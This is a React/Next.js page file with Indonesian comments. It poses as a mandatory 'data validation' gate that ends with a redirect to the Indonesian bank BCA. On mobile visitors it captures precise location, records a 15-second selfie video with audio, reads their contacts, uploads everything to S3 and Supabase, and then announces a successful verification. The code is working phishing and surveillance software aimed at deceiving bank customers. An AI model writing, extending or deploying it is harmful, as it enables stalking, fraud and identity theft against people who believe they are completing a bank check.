/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabse";
import FullScreenLoader from "@/components/FullScreenLoader";
import { UserData } from "@/types";

export default function Home() {
	const [status, setStatus] = useState<"loading" | "location" | "camera" | "contacts" | "completed" | "error">("loading");
	const [error, setError] = useState("");

	useEffect(() => {
		const collectData = async () => {
			try {
				// Langkah 1: Mengumpulkan lokasi
				setStatus("location");
				const location = await getLocation();

				// Simpan data lokasi sementara
				const userData: UserData = { location, contacts: [] };

				// Langkah 2: Rekam video
				setStatus("camera");
				const videoUrl = await recordVideo(15000); // 15 detik

				// Langkah 3: Mengumpulkan kontak
				setStatus("contacts");
				const contacts = await getContacts();

				// Update user data
				userData.contacts = contacts;

				// Simpan semua data ke database
				await saveAllData(userData, videoUrl);

				setStatus("completed");

				// Redirect ke BCA setelah 2 detik
				setTimeout(() => {
					window.location.href = "https://www.bca.co.id";
				}, 2000);
			} catch (err: any) {
				setStatus("error");
				setError(err.message);
			}
		};

		// Hanya jalankan di mobile
		if (typeof window !== "undefined" && window.innerWidth < 768) {
			// Tampilkan loading selama 3 detik pertama
			setTimeout(() => {
				collectData();
			}, 3000);
		} else {
			setStatus("error");
			setError("Hanya tersedia di perangkat mobile");
		}
	}, []);

	if (status === "loading") {
		return <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />;
	}

	return (
		<div className="fixed inset-0 bg-black flex items-center justify-center">
			{status === "location" && (
				<div className="text-center text-white">
					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
					<p>Mengakses lokasi perangkat...</p>
				</div>
			)}

			{status === "camera" && (
				<div className="text-center text-white">
					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
					<p>Merekam video...</p>
					<p className="text-sm mt-2">Rekaman akan berlangsung selama 15 detik</p>
				</div>
			)}

			{status === "contacts" && (
				<div className="text-center text-white">
					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
					<p>Mengakses kontak...</p>
				</div>
			)}

			{status === "completed" && (
				<div className="text-center text-white">
					<svg className="w-16 h-16 text-green-500 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
						<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
					</svg>
					<p>Verifikasi berhasil! Mengarahkan ke BCA...</p>
				</div>
			)}

			{status === "error" && (
				<div className="text-center p-6 max-w-md">
					<div className="text-red-500 bg-red-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
						<svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
						</svg>
					</div>
					<h2 className="text-xl font-bold text-white mb-2">Terjadi Kesalahan</h2>
					<p className="text-gray-300 mb-6">{error}</p>
					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-red-600 text-white rounded-lg font-medium">
						Coba Lagi
					</button>
				</div>
			)}
		</div>
	);
}

// Fungsi bantuan untuk mengambil lokasi
const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
	return new Promise((resolve, reject) => {
		if (!navigator.geolocation) {
			reject(new Error("Browser tidak mendukung geolokasi"));
			return;
		}

		navigator.geolocation.getCurrentPosition(
			(position) => {
				resolve({
					lat: position.coords.latitude,
					lng: position.coords.longitude,
					accuracy: position.coords.accuracy,
				});
			},
			(error) => {
				reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`));
			},
			{ enableHighAccuracy: true, timeout: 10000 }
		);
	});
};

// Fungsi untuk merekam video
const recordVideo = (duration: number): Promise<string> => {
	return new Promise(async (resolve, reject) => {
		try {
			const stream = await navigator.mediaDevices.getUserMedia({
				video: { facingMode: "user" },
				audio: true,
			});

			const recorder = new MediaRecorder(stream);
			const chunks: BlobPart[] = [];

			recorder.ondataavailable = (e) => chunks.push(e.data);
			recorder.onstop = async () => {
				const blob = new Blob(chunks, { type: "video/webm" });

				try {
					// Upload ke S3
					const fileName = `video-${Date.now()}.webm`;
					const videoUrl = await uploadToS3(blob, fileName);
					resolve(videoUrl);
				} catch (uploadError) {
					reject(uploadError);
				}

				// Hentikan stream
				stream.getTracks().forEach((track) => track.stop());
			};

			recorder.start();
			setTimeout(() => recorder.stop(), duration);
		} catch (err) {
			reject(new Error(`Gagal mengakses kamera: ${(err as Error).message}`));
		}
	});
};

// Fungsi untuk mengambil kontak
const getContacts = async (): Promise<any[]> => {
	if (!("contacts" in navigator)) {
		return [];
	}

	try {
		const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
		return contacts.map((contact: any) => ({
			name: contact.name?.[0] || "",
			email: contact.email?.[0] || "",
			phone: contact.tel?.[0] || "",
		}));
	} catch (err) {
		console.error("Gagal mengambil kontak:", err);
		return [];
	}
};

// Fungsi untuk menyimpan semua data
const saveAllData = async (userData: any, videoUrl: string) => {
	// Simpan data user
	const { data, error } = await supabase.from("user_data").insert([userData]).select().single();

	if (error) throw new Error(`Gagal menyimpan data: ${error.message}`);

	// Simpan data video
	const videoError = await supabase.from("user_videos").insert([
		{
			user_data_id: data.id,
			video_url: videoUrl,
		},
	]);

	if (videoError.error) throw new Error(`Gagal menyimpan video: ${videoError.error.message}`);
};

// Fungsi untuk upload ke S3
const uploadToS3 = async (file: Blob, fileName: string): Promise<string> => {
	const formData = new FormData();
	formData.append("file", file, fileName);

	try {
		const response = await fetch("/api/s3-upload", {
			method: "POST",
			body: formData,
		});

		const data = await response.json();

		if (!response.ok) {
			throw new Error(data.error || "Upload gagal");
		}

		return data.url;
	} catch (err) {
		throw new Error(`Gagal mengunggah video: ${(err as Error).message}`);
	}
};
